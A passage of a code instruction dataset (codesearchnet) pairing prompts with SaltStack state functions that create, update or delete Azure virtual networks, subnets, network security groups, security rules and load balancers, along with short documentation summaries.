created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create virtual network {0}! ({1})'.format(name, vnet.get('error'))\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef virtual_network_absent(name, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a virtual network does not exist in the resource group.\n\n    :param name:\n        Name of the virtual network.\n\n    :param resource_group:\n        The resource group assigned to the virtual network.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    vnet = __salt__['azurearm_network.virtual_network_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in vnet:\n        ret['result'] = True\n        ret['comment'] = 'Virtual network {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Virtual network {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': vnet,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.virtual_network_delete'](name, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Virtual network {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': vnet,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete virtual network {0}!'.format(name)\n    return ret", "response": "Ensure a virtual network is absent in the resource group."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nensuring a subnet exists in the virtual network.", "response": "def subnet_present(name, address_prefix, virtual_network, resource_group,\n                   security_group=None, route_table=None, connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a subnet exists.\n\n    :param name:\n        Name of the subnet.\n\n    :param address_prefix:\n        A CIDR block used by the subnet within the virtual network.\n\n    :param virtual_network:\n        Name of the existing virtual network to contain the subnet.\n\n    :param resource_group:\n        The resource group assigned to the virtual network.\n\n    :param security_group:\n        The name of the existing network security group to assign to the subnet.\n\n    :param route_table:\n        The name of the existing route table to assign to the subnet.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure subnet exists:\n            azurearm_network.subnet_present:\n                - name: vnet1_sn1\n                - virtual_network: vnet1\n                - resource_group: group1\n                - address_prefix: '192.168.1.0/24'\n                - security_group: nsg1\n                - route_table: rt1\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_network: Ensure virtual network exists\n                  - azurearm_network: Ensure network security group exists\n                  - azurearm_network: Ensure route table exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    snet = __salt__['azurearm_network.subnet_get'](\n        name,\n        virtual_network,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in snet:\n        if address_prefix != snet.get('address_prefix'):\n            ret['changes']['address_prefix'] = {\n                'old': snet.get('address_prefix'),\n                'new': address_prefix\n            }\n\n        nsg_name = None\n        if snet.get('network_security_group'):\n            nsg_name = snet['network_security_group']['id'].split('/')[-1]\n\n        if security_group and (security_group != nsg_name):\n            ret['changes']['network_security_group'] = {\n                'old': nsg_name,\n                'new': security_group\n            }\n\n        rttbl_name = None\n        if snet.get('route_table'):\n            rttbl_name = snet['route_table']['id'].split('/')[-1]\n\n        if route_table and (route_table != rttbl_name):\n            ret['changes']['route_table'] = {\n                'old': rttbl_name,\n                'new': route_table\n            }\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Subnet {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Subnet {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'address_prefix': address_prefix,\n                'network_security_group': security_group,\n                'route_table': route_table\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Subnet {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    snet_kwargs = kwargs.copy()\n    snet_kwargs.update(connection_auth)\n\n    snet = __salt__['azurearm_network.subnet_create_or_update'](\n        name=name,\n        virtual_network=virtual_network,\n        resource_group=resource_group,\n        address_prefix=address_prefix,\n        network_security_group=security_group,\n        route_table=route_table,\n        **snet_kwargs\n    )\n\n    if 'error' not in snet:\n        ret['result'] = True\n        ret['comment'] = 'Subnet {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create subnet {0}! ({1})'.format(name, snet.get('error'))\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef subnet_absent(name, virtual_network, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a virtual network does not exist in the virtual network.\n\n    :param name:\n        Name of the subnet.\n\n    :param virtual_network:\n        Name of the existing virtual network containing the subnet.\n\n    :param resource_group:\n        The resource group assigned to the virtual network.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    snet = __salt__['azurearm_network.subnet_get'](\n        name,\n        virtual_network,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in snet:\n        ret['result'] = True\n        ret['comment'] = 'Subnet {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Subnet {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': snet,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.subnet_delete'](name, virtual_network, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Subnet {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': snet,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete subnet {0}!'.format(name)\n    return ret", "response": "Ensure a subnet is absent in the virtual network."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef network_security_group_present(name, resource_group, tags=None, security_rules=None, connection_auth=None,\n                                   **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a network security group exists.\n\n    :param name:\n        Name of the network security group.\n\n    :param resource_group:\n        The resource group assigned to the network security group.\n\n    :param tags:\n        A dictionary of strings can be passed as tag metadata to the network security group object.\n\n    :param security_rules: An optional list of dictionaries representing valid SecurityRule objects. See the\n        documentation for the security_rule_present state or security_rule_create_or_update execution module\n        for more information on required and optional parameters for security rules. The rules are only\n        managed if this parameter is present. When this parameter is absent, implemented rules will not be removed,\n        and will merely become unmanaged.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure network security group exists:\n            azurearm_network.network_security_group_present:\n                - name: nsg1\n                - resource_group: group1\n                - security_rules:\n                  - name: nsg1_rule1\n                    priority: 100\n                    protocol: tcp\n                    access: allow\n                    direction: outbound\n                    source_address_prefix: virtualnetwork\n                    destination_address_prefix: internet\n                    source_port_range: '*'\n                    destination_port_range: '*'\n                  - name: nsg1_rule2\n                    priority: 101\n                    protocol: tcp\n                    access: allow\n                    direction: inbound\n                    source_address_prefix: internet\n                    destination_address_prefix: virtualnetwork\n                    source_port_range: '*'\n                    destination_port_ranges:\n                      - '80'\n                      - '443'\n                - tags:\n                    contact_name: Elmer Fudd Gantry\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_resource: Ensure resource group exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    nsg = __salt__['azurearm_network.network_security_group_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in nsg:\n        tag_changes = __utils__['dictdiffer.deep_diff'](nsg.get('tags', {}), tags or {})\n        if tag_changes:\n            ret['changes']['tags'] = tag_changes\n\n        if security_rules:\n            comp_ret = __utils__['azurearm.compare_list_of_dicts'](nsg.get('security_rules', []), security_rules)\n\n            if comp_ret.get('comment'):\n                ret['comment'] = '\"security_rules\" {0}'.format(comp_ret['comment'])\n                return ret\n\n            if comp_ret.get('changes'):\n                ret['changes']['security_rules'] = comp_ret['changes']\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Network security group {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Network security group {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'resource_group': resource_group,\n                'tags': tags,\n                'security_rules': security_rules,\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Network security group {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    nsg_kwargs = kwargs.copy()\n    nsg_kwargs.update(connection_auth)\n\n    nsg = __salt__['azurearm_network.network_security_group_create_or_update'](\n        name=name,\n        resource_group=resource_group,\n        tags=tags,\n        security_rules=security_rules,\n        **nsg_kwargs\n    )\n\n    if 'error' not in nsg:\n        ret['result'] = True\n        ret['comment'] = 'Network security group {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create network security group {0}! ({1})'.format(name, nsg.get('error'))\n    return ret", "response": "Ensures a network security group exists."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nensure a network security group is absent in the resource group.", "response": "def network_security_group_absent(name, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a network security group does not exist in the resource group.\n\n    :param name:\n        Name of the network security group.\n\n    :param resource_group:\n        The resource group assigned to the network security group.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    nsg = __salt__['azurearm_network.network_security_group_get'](\n        name,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in nsg:\n        ret['result'] = True\n        ret['comment'] = 'Network security group {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Network security group {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': nsg,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.network_security_group_delete'](name, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Network security group {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': nsg,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete network security group {0}!'.format(name)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef security_rule_present(name, access, direction, priority, protocol, security_group, resource_group,\n                          destination_address_prefix=None, destination_port_range=None, source_address_prefix=None,\n                          source_port_range=None, description=None, destination_address_prefixes=None,\n                          destination_port_ranges=None, source_address_prefixes=None, source_port_ranges=None,\n                          connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a security rule exists.\n\n    :param name:\n        Name of the security rule.\n\n    :param access:\n        'allow' or 'deny'\n\n    :param direction:\n        'inbound' or 'outbound'\n\n    :param priority:\n        Integer between 100 and 4096 used for ordering rule application.\n\n    :param protocol:\n        'tcp', 'udp', or '*'\n\n    :param security_group:\n        The name of the existing network security group to contain the security rule.\n\n    :param resource_group:\n        The resource group assigned to the network security group.\n\n    :param description:\n        Optional description of the security rule.\n\n    :param destination_address_prefix:\n        The CIDR or destination IP range. Asterix '*' can also be used to match all destination IPs.\n        Default tags such as 'VirtualNetwork', 'AzureLoadBalancer' and 'Internet' can also be used.\n        If this is an ingress rule, specifies where network traffic originates from.\n\n    :param destination_port_range:\n        The destination port or range. Integer or range between 0 and 65535. Asterix '*'\n        can also be used to match all ports.\n\n    :param source_address_prefix:\n        The CIDR or source IP range. Asterix '*' can also be used to match all source IPs.\n        Default tags such as 'VirtualNetwork', 'AzureLoadBalancer' and 'Internet' can also be used.\n        If this is an ingress rule, specifies where network traffic originates from.\n\n    :param source_port_range:\n        The source port or range. Integer or range between 0 and 65535. Asterix '*'\n        can also be used to match all ports.\n\n    :param destination_address_prefixes:\n        A list of destination_address_prefix values. This parameter overrides destination_address_prefix\n        and will cause any value entered there to be ignored.\n\n    :param destination_port_ranges:\n        A list of destination_port_range values. This parameter overrides destination_port_range\n        and will cause any value entered there to be ignored.\n\n    :param source_address_prefixes:\n        A list of source_address_prefix values. This parameter overrides source_address_prefix\n        and will cause any value entered there to be ignored.\n\n    :param source_port_ranges:\n        A list of source_port_range values. This parameter overrides source_port_range\n        and will cause any value entered there to be ignored.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure security rule exists:\n            azurearm_network.security_rule_present:\n                - name: nsg1_rule2\n                - security_group: nsg1\n                - resource_group: group1\n                - priority: 101\n                - protocol: tcp\n                - access: allow\n                - direction: inbound\n                - source_address_prefix: internet\n                - destination_address_prefix: virtualnetwork\n                - source_port_range: '*'\n                - destination_port_ranges:\n                  - '80'\n                  - '443'\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_network: Ensure network security group exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    exclusive_params = [\n        ('source_port_ranges', 'source_port_range'),\n        ('source_address_prefixes', 'source_address_prefix'),\n        ('destination_port_ranges', 'destination_port_range'),\n        ('destination_address_prefixes', 'destination_address_prefix'),\n    ]\n\n    for params in exclusive_params:\n        # pylint: disable=eval-used\n        if not eval(params[0]) and not eval(params[1]):\n            ret['comment'] = 'Either the {0} or {1} parameter must be provided!'.format(params[0], params[1])\n            return ret\n        # pylint: disable=eval-used\n        if eval(params[0]):\n            # pylint: disable=eval-used\n            if not isinstance(eval(params[0]), list):\n                ret['comment'] = 'The {0} parameter must be a list!'.format(params[0])\n                return ret\n            # pylint: disable=exec-used\n            exec('{0} = None'.format(params[1]))\n\n    rule = __salt__['azurearm_network.security_rule_get'](\n        name,\n        security_group,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' not in rule:\n        # access changes\n        if access.capitalize() != rule.get('access'):\n            ret['changes']['access'] = {\n                'old': rule.get('access'),\n                'new': access\n            }\n\n        # description changes\n        if description != rule.get('description'):\n            ret['changes']['description'] = {\n                'old': rule.get('description'),\n                'new': description\n            }\n\n        # direction changes\n        if direction.capitalize() != rule.get('direction'):\n            ret['changes']['direction'] = {\n                'old': rule.get('direction'),\n                'new': direction\n            }\n\n        # priority changes\n        if int(priority) != rule.get('priority'):\n            ret['changes']['priority'] = {\n                'old': rule.get('priority'),\n                'new': priority\n            }\n\n        # protocol changes\n        if protocol.lower() != rule.get('protocol', '').lower():\n            ret['changes']['protocol'] = {\n                'old': rule.get('protocol'),\n                'new': protocol\n            }\n\n        # destination_port_range changes\n        if destination_port_range != rule.get('destination_port_range'):\n            ret['changes']['destination_port_range'] = {\n                'old': rule.get('destination_port_range'),\n                'new': destination_port_range\n            }\n\n        # source_port_range changes\n        if source_port_range != rule.get('source_port_range'):\n            ret['changes']['source_port_range'] = {\n                'old': rule.get('source_port_range'),\n                'new': source_port_range\n            }\n\n        # destination_port_ranges changes\n        if sorted(destination_port_ranges or []) != sorted(rule.get('destination_port_ranges', [])):\n            ret['changes']['destination_port_ranges'] = {\n                'old': rule.get('destination_port_ranges'),\n                'new': destination_port_ranges\n            }\n\n        # source_port_ranges changes\n        if sorted(source_port_ranges or []) != sorted(rule.get('source_port_ranges', [])):\n            ret['changes']['source_port_ranges'] = {\n                'old': rule.get('source_port_ranges'),\n                'new': source_port_ranges\n            }\n\n        # destination_address_prefix changes\n        if (destination_address_prefix or '').lower() != rule.get('destination_address_prefix', '').lower():\n            ret['changes']['destination_address_prefix'] = {\n                'old': rule.get('destination_address_prefix'),\n                'new': destination_address_prefix\n            }\n\n        # source_address_prefix changes\n        if (source_address_prefix or '').lower() != rule.get('source_address_prefix', '').lower():\n            ret['changes']['source_address_prefix'] = {\n                'old': rule.get('source_address_prefix'),\n                'new': source_address_prefix\n            }\n\n        # destination_address_prefixes changes\n        if sorted(destination_address_prefixes or []) != sorted(rule.get('destination_address_prefixes', [])):\n            if len(destination_address_prefixes or []) != len(rule.get('destination_address_prefixes', [])):\n                ret['changes']['destination_address_prefixes'] = {\n                    'old': rule.get('destination_address_prefixes'),\n                    'new': destination_address_prefixes\n                }\n            else:\n                local_dst_addrs, remote_dst_addrs = (sorted(destination_address_prefixes),\n                                                     sorted(rule.get('destination_address_prefixes')))\n                for idx in six_range(0, len(local_dst_addrs)):\n                    if local_dst_addrs[idx].lower() != remote_dst_addrs[idx].lower():\n                        ret['changes']['destination_address_prefixes'] = {\n                            'old': rule.get('destination_address_prefixes'),\n                            'new': destination_address_prefixes\n                        }\n                        break\n\n        # source_address_prefixes changes\n        if sorted(source_address_prefixes or []) != sorted(rule.get('source_address_prefixes', [])):\n            if len(source_address_prefixes or []) != len(rule.get('source_address_prefixes', [])):\n                ret['changes']['source_address_prefixes'] = {\n                    'old': rule.get('source_address_prefixes'),\n                    'new': source_address_prefixes\n                }\n            else:\n                local_src_addrs, remote_src_addrs = (sorted(source_address_prefixes),\n                                                     sorted(rule.get('source_address_prefixes')))\n                for idx in six_range(0, len(local_src_addrs)):\n                    if local_src_addrs[idx].lower() != remote_src_addrs[idx].lower():\n                        ret['changes']['source_address_prefixes'] = {\n                            'old': rule.get('source_address_prefixes'),\n                            'new': source_address_prefixes\n                        }\n                        break\n\n        if not ret['changes']:\n            ret['result'] = True\n            ret['comment'] = 'Security rule {0} is already present.'.format(name)\n            return ret\n\n        if __opts__['test']:\n            ret['result'] = None\n            ret['comment'] = 'Security rule {0} would be updated.'.format(name)\n            return ret\n\n    else:\n        ret['changes'] = {\n            'old': {},\n            'new': {\n                'name': name,\n                'access': access,\n                'description': description,\n                'direction': direction,\n                'priority': priority,\n                'protocol': protocol,\n                'destination_address_prefix': destination_address_prefix,\n                'destination_address_prefixes': destination_address_prefixes,\n                'destination_port_range': destination_port_range,\n                'destination_port_ranges': destination_port_ranges,\n                'source_address_prefix': source_address_prefix,\n                'source_address_prefixes': source_address_prefixes,\n                'source_port_range': source_port_range,\n                'source_port_ranges': source_port_ranges,\n            }\n        }\n\n    if __opts__['test']:\n        ret['comment'] = 'Security rule {0} would be created.'.format(name)\n        ret['result'] = None\n        return ret\n\n    rule_kwargs = kwargs.copy()\n    rule_kwargs.update(connection_auth)\n\n    rule = __salt__['azurearm_network.security_rule_create_or_update'](\n        name=name,\n        access=access,\n        description=description,\n        direction=direction,\n        priority=priority,\n        protocol=protocol,\n        security_group=security_group,\n        resource_group=resource_group,\n        destination_address_prefix=destination_address_prefix,\n        destination_address_prefixes=destination_address_prefixes,\n        destination_port_range=destination_port_range,\n        destination_port_ranges=destination_port_ranges,\n        source_address_prefix=source_address_prefix,\n        source_address_prefixes=source_address_prefixes,\n        source_port_range=source_port_range,\n        source_port_ranges=source_port_ranges,\n        **rule_kwargs\n    )\n\n    if 'error' not in rule:\n        ret['result'] = True\n        ret['comment'] = 'Security rule {0} has been created.'.format(name)\n        return ret\n\n    ret['comment'] = 'Failed to create security rule {0}! ({1})'.format(name, rule.get('error'))\n    return ret", "response": "Ensures a security rule exists in the network."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nensuring a security rule is absent in the network security group.", "response": "def security_rule_absent(name, security_group, resource_group, connection_auth=None):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a security rule does not exist in the network security group.\n\n    :param name:\n        Name of the security rule.\n\n    :param security_group:\n        The network security group containing the security rule.\n\n    :param resource_group:\n        The resource group assigned to the network security group.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': '',\n        'changes': {}\n    }\n\n    if not isinstance(connection_auth, dict):\n        ret['comment'] = 'Connection information must be specified via connection_auth dictionary!'\n        return ret\n\n    rule = __salt__['azurearm_network.security_rule_get'](\n        name,\n        security_group,\n        resource_group,\n        azurearm_log_level='info',\n        **connection_auth\n    )\n\n    if 'error' in rule:\n        ret['result'] = True\n        ret['comment'] = 'Security rule {0} was not found.'.format(name)\n        return ret\n\n    elif __opts__['test']:\n        ret['comment'] = 'Security rule {0} would be deleted.'.format(name)\n        ret['result'] = None\n        ret['changes'] = {\n            'old': rule,\n            'new': {},\n        }\n        return ret\n\n    deleted = __salt__['azurearm_network.security_rule_delete'](name, security_group, resource_group, **connection_auth)\n\n    if deleted:\n        ret['result'] = True\n        ret['comment'] = 'Security rule {0} has been deleted.'.format(name)\n        ret['changes'] = {\n            'old': rule,\n            'new': {}\n        }\n        return ret\n\n    ret['comment'] = 'Failed to delete security rule {0}!'.format(name)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nensures that a load balancer exists and is up - to - date.", "response": "def load_balancer_present(name, resource_group, sku=None, frontend_ip_configurations=None, backend_address_pools=None,\n                          load_balancing_rules=None, probes=None, inbound_nat_rules=None, inbound_nat_pools=None,\n                          outbound_nat_rules=None, tags=None, connection_auth=None, **kwargs):\n    '''\n    .. versionadded:: 2019.2.0\n\n    Ensure a load balancer exists.\n\n    :param name:\n        Name of the load balancer.\n\n    :param resource_group:\n        The resource group assigned to the load balancer.\n\n    :param sku:\n        The load balancer SKU, which can be 'Basic' or 'Standard'.\n\n    :param tags:\n        A dictionary of strings can be passed as tag metadata to the load balancer object.\n\n    :param frontend_ip_configurations:\n        An optional list of dictionaries representing valid FrontendIPConfiguration objects. A frontend IP\n        configuration can be either private (using private IP address and subnet parameters) or public (using a\n        reference to a public IP address object). Valid parameters are:\n\n        - ``name``: The name of the resource that is unique within a resource group.\n        - ``private_ip_address``: The private IP address of the IP configuration. Required if\n          'private_ip_allocation_method' is 'Static'.\n        - ``private_ip_allocation_method``: The Private IP allocation method. Possible values are: 'Static' and\n          'Dynamic'.\n        - ``subnet``: Name of an existing subnet inside of which the frontend IP will reside.\n        - ``public_ip_address``: Name of an existing public IP address which will be assigned to the frontend IP object.\n\n    :param backend_address_pools:\n        An optional list of dictionaries representing valid BackendAddressPool objects. Only the 'name' parameter is\n        valid for a BackendAddressPool dictionary. All other parameters are read-only references from other objects\n        linking to the backend address pool. Inbound traffic is randomly load balanced across IPs in the backend IPs.\n\n    :param probes:\n        An optional list of dictionaries representing valid Probe objects. Valid parameters are:\n\n        - ``name``: The name of the resource that is unique within a resource group.\n        - ``protocol``: The protocol of the endpoint. Possible values are 'Http' or 'Tcp'. If 'Tcp' is specified, a\n          received ACK is required for the probe to be successful. If 'Http' is specified, a 200 OK response from the\n          specified URI is required for the probe to be successful.\n        - ``port``: The port for communicating the probe. Possible values range from 1 to 65535, inclusive.\n        - ``interval_in_seconds``: The interval, in seconds, for how frequently to probe the endpoint for health status.\n          Typically, the interval is slightly less than half the allocated timeout period (in seconds) which allows two\n          full probes before taking the instance out of rotation. The default value is 15, the minimum value is 5.\n        - ``number_of_probes``: The number of probes where if no response, will result in stopping further traffic from\n          being delivered to the endpoint. This values allows endpoints to be taken out of rotation faster or slower\n          than the typical times used in Azure.\n        - ``request_path``: The URI used for requesting health status from the VM. Path is required if a protocol is\n          set to 'Http'. Otherwise, it is not allowed. There is no default value.\n\n    :param load_balancing_rules:\n        An optional list of dictionaries representing valid LoadBalancingRule objects. Valid parameters are:\n\n        - ``name``: The name of the resource that is unique within a resource group.\n        - ``load_distribution``: The load distribution policy for this rule. Possible values are 'Default', 'SourceIP',\n          and 'SourceIPProtocol'.\n        - ``frontend_port``: The port for the external endpoint. Port numbers for each rule must be unique within the\n          Load Balancer. Acceptable values are between 0 and 65534. Note that value 0 enables 'Any Port'.\n        - ``backend_port``: The port used for internal connections on the endpoint. Acceptable values are between 0 and\n          65535. Note that value 0 enables 'Any Port'.\n        - ``idle_timeout_in_minutes``: The timeout for the TCP idle connection. The value can be set between 4 and 30\n          minutes. The default value is 4 minutes. This element is only used when the protocol is set to TCP.\n        - ``enable_floating_ip``: Configures a virtual machine's endpoint for the floating IP capability required\n          to configure a SQL AlwaysOn Availability Group. This setting is required when using the SQL AlwaysOn\n          Availability Groups in SQL server. This setting can't be changed after you create the endpoint.\n        - ``disable_outbound_snat``: Configures SNAT for the VMs in the backend pool to use the public IP address\n          specified in the frontend of the load balancing rule.\n        - ``frontend_ip_configuration``: Name of the frontend IP configuration object used by the load balancing rule\n          object.\n        - ``backend_address_pool``: Name of the backend address pool object used by the load balancing rule object.\n          Inbound traffic is randomly load balanced across IPs in the backend IPs.\n        - ``probe``: Name of the probe object used by the load balancing rule object.\n\n    :param inbound_nat_rules:\n        An optional list of dictionaries representing valid InboundNatRule objects. Defining inbound NAT rules on your\n        load balancer is mutually exclusive with defining an inbound NAT pool. Inbound NAT pools are referenced from\n        virtual machine scale sets. NICs that are associated with individual virtual machines cannot reference an\n        Inbound NAT pool. They have to reference individual inbound NAT rules. Valid parameters are:\n\n        - ``name``: The name of the resource that is unique within a resource group.\n        - ``frontend_ip_configuration``: Name of the frontend IP configuration object used by the inbound NAT rule\n          object.\n        - ``protocol``: Possible values include 'Udp', 'Tcp', or 'All'.\n        - ``frontend_port``: The port for the external endpoint. Port numbers for each rule must be unique within the\n          Load Balancer. Acceptable values range from 1 to 65534.\n        - ``backend_port``: The port used for the internal endpoint. Acceptable values range from 1 to 65535.\n        - ``idle_timeout_in_minutes``: The timeout for the TCP idle connection. The value can be set between 4 and 30\n          minutes. The default value is 4 minutes. This element is only used when the protocol is set to TCP.\n        - ``enable_floating_ip``: Configures a virtual machine's endpoint for the floating IP capability required\n          to configure a SQL AlwaysOn Availability Group. This setting is required when using the SQL AlwaysOn\n          Availability Groups in SQL server. This setting can't be changed after you create the endpoint.\n\n    :param inbound_nat_pools:\n        An optional list of dictionaries representing valid InboundNatPool objects. They define an external port range\n        for inbound NAT to a single backend port on NICs associated with a load balancer. Inbound NAT rules are created\n        automatically for each NIC associated with the Load Balancer using an external port from this range. Defining an\n        Inbound NAT pool on your Load Balancer is mutually exclusive with defining inbound NAT rules. Inbound NAT pools\n        are referenced from virtual machine scale sets. NICs that are associated with individual virtual machines cannot\n        reference an inbound NAT pool. They have to reference individual inbound NAT rules. Valid parameters are:\n\n        - ``name``: The name of the resource that is unique within a resource group.\n        - ``frontend_ip_configuration``: Name of the frontend IP configuration object used by the inbound NAT pool\n          object.\n        - ``protocol``: Possible values include 'Udp', 'Tcp', or 'All'.\n        - ``frontend_port_range_start``: The first port number in the range of external ports that will be used to\n          provide Inbound NAT to NICs associated with a load balancer. Acceptable values range between 1 and 65534.\n        - ``frontend_port_range_end``: The last port number in the range of external ports that will be used to\n          provide Inbound NAT to NICs associated with a load balancer. Acceptable values range between 1 and 65535.\n        - ``backend_port``: The port used for internal connections to the endpoint. Acceptable values are between 1 and\n          65535.\n\n    :param outbound_nat_rules:\n        An optional list of dictionaries representing valid OutboundNatRule objects. Valid parameters are:\n\n        - ``name``: The name of the resource that is unique within a resource group.\n        - ``frontend_ip_configuration``: Name of the frontend IP configuration object used by the outbound NAT rule\n          object.\n        - ``backend_address_pool``: Name of the backend address pool object used by the outbound NAT rule object.\n          Outbound traffic is randomly load balanced across IPs in the backend IPs.\n        - ``allocated_outbound_ports``: The number of outbound ports to be used for NAT.\n\n    :param connection_auth:\n        A dict with subscription and authentication parameters to be used in connecting to the\n        Azure Resource Manager API.\n\n    Example usage:\n\n    .. code-block:: yaml\n\n        Ensure load balancer exists:\n            azurearm_network.load_balancer_present:\n                - name: lb1\n                - resource_group: group1\n                - location: eastus\n                - frontend_ip_configurations:\n                  - name: lb1_feip1\n                    public_ip_address: pub_ip1\n                - backend_address_pools:\n                  - name: lb1_bepool1\n                - probes:\n                  - name: lb1_webprobe1\n                    protocol: tcp\n                    port: 80\n                    interval_in_seconds: 5\n                    number_of_probes: 2\n                - load_balancing_rules:\n                  - name: lb1_webprobe1\n                    protocol: tcp\n                    frontend_port: 80\n                    backend_port: 80\n                    idle_timeout_in_minutes: 4\n                    frontend_ip_configuration: lb1_feip1\n                    backend_address_pool: lb1_bepool1\n                    probe: lb1_webprobe1\n                - tags:\n                    contact_name: Elmer Fudd Gantry\n                - connection_auth: {{ profile }}\n                - require:\n                  - azurearm_resource: Ensure resource group exists\n                  - azurearm_network: Ensure public IP exists\n\n    '''\n    ret = {\n        'name': name,\n        'result': False,\n        'comment': 